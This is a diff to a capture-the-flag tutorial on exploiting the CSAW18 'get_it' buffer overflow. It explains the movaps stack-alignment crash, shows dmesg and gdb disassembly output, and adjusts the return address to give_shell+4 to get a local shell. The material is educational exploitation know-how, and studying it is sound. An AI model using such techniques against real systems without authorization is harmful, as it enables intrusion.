@@ -114,20 +114,48 @@ target.sendline(payload)
 target.interactive()
 ```
 
-When we run it, we see the below text. This might crash on the `system("/bin/bash")` if you are running it on a more modern version of Ubuntu. If it does, ignore it and move on, consider this challenge solved (as long as you are successfully calling the `give_shell` function). This is because the challenge was made to run in a different environment/libc version, and exploitation techniques that work one way in one environment work differently in others:
+When we run it, we see the below text. This will crash on the `system("/bin/bash")` if you are running it on a more modern version of libc. 
+
+To learn more about the fault, use `dmesg | tail` to find information: 
+
 ```
-$    python3 exploit.py
-[+] Starting local process './get_it': pid 2969
-[*] running in new terminal: /usr/bin/gdb -q  "./get_it" 2969 -x "/tmp/pwndObRhj.gdb"
-[+] Waiting for debugger: Done
-[*] Switching to interactive mode
-Do you gets it??
-$ w
- 23:38:26 up 1 min,  1 user,  load average: 1.77, 0.67, 0.25
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu tty7     :0               23:37    1:20   2.71s  0.14s /sbin/upstart --user
-$ ls
-exploit.py  get_it
+[32831.741915] traps: get_it[18795] general protection fault ip:7f36c59e92d6 sp:7fff53ea3598 error:0 in libc-2.27.so[7f36c599a000+1e7000]
+[32831.864442] get_it[18794]: segfault at 0 ip 0000000000000000 sp 00007fff53ea3748 error 14 in get_it[400000+1000]
+[32831.864450] Code: Bad RIP value.
+
 ```
 
-Just like that we got a shell!
+Verify that you are successfully calling the `give_shell` function using the same method you did last time. Once you verify it, we are going to fix the problem instead of ignoring it like last time.
+
+As mentioned last time, the problem is quite well known as "The Movaps Problem":
+
+The x86 `movaps` instruction will trigger a general protection fault when operating on unaligned data, aka any time it isn't 16 byte aligned prior to a call. This means we need to find a way to align bytes in a way that libc doesn't dislike. There are multiple ways to do this that you'll get better at, but for now the easiest way is to just jump deeper into the function instead of the first instruction... we don't need to set up the stack frame properly anyway! 
+
+```
+gef➤  disass give_shell 
+Dump of assembler code for function give_shell:
+   0x00000000004005b6 <+0>:	push   rbp
+   0x00000000004005b7 <+1>:	mov    rbp,rsp
+   0x00000000004005ba <+4>:	mov    edi,0x400684
+   0x00000000004005bf <+9>:	call   0x400480 <system@plt>
+   0x00000000004005c4 <+14>:	nop
+   0x00000000004005c5 <+15>:	pop    rbp
+   0x00000000004005c6 <+16>:	ret    
+End of assembler dump.
+```
+
+Let's go with 0x04005ba, which is a 4 away from *give_shell+0.
+
+Replace the address of give_shell with that address for *give_shell+4 and run exploit.py again.
+
+```
+devey@m171458:~/Documents/github/nightmare/modules/04-Overflows/05-bof_callfunction/csaw18_getit$ python3 exploit.py 
+[+] Starting local process './get_it': pid 18007
+[*] Switching to interactive mode
+Do you gets it??
+$ ls
+core  exploit.py  get_it  payload  readme.md
+$  
+```
+
+Just like that we got a shell! Feeling 1337 yet?
